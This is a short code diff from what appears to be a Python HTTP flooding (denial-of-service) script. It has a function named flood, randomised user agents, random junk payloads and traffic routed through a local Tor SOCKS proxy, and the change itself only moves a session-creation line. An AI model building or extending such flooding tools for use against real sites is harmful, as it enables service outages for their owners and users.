@@ -22,8 +22,8 @@ def flood(target,domainname,attack,sock):
     "Accept-Encoding": "gzip, deflate, br",
     "User-agent": random.choice(user_agents),"host":domainname,
     }
+    s = requests.Session()
     payload = str(random._urandom(random.randint(10, 500)))
-	s = requests.Session()
 	if sock =='http':
 		proxies = {'http': "socks5://127.0.0.1:9050"}
 	elif sock =='https':
